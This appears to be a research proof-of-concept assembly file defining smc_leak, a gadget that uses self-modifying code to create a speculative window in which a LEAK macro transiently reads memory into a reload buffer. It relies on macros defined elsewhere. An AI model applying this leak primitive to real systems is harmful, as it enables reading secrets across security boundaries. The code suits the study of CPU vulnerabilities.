%include "common.S"

section .text
default rel

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; smc_leak(uint8_t *reload_buffer, uint8_t *leak_ptr)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global smc_leak
align 0x1000
smc_leak:
    push    r14
    push    r15
    

    ;Backup + Setup
    mov     rax, qword [smc_leak_spec]
    push    rax

    lea     r14, [smc_leak_spec]
    lea     r15, [smc_leak_arch]
    SERIALIZE

    ;Make the store slow
    %rep 16         ;TWEAK
    imul    r14, 1
    %endrep

    ;Overwrite instruction at smc_leak_spec with a "jmp r15" with r15 = smc_leak_arch
    mov     dword [r14], 0xe7ff4190 ;jmp r15 

smc_leak_spec:
    LEAK    rdi, rsi
    jmp     smc_leak_spec   ;Be sure that this code is executed only speculatively

smc_leak_arch:
    ;Restore
    pop     rax
    mov     qword [smc_leak_spec], rax
    mfence
    pop     r15
    pop     r14
    ret
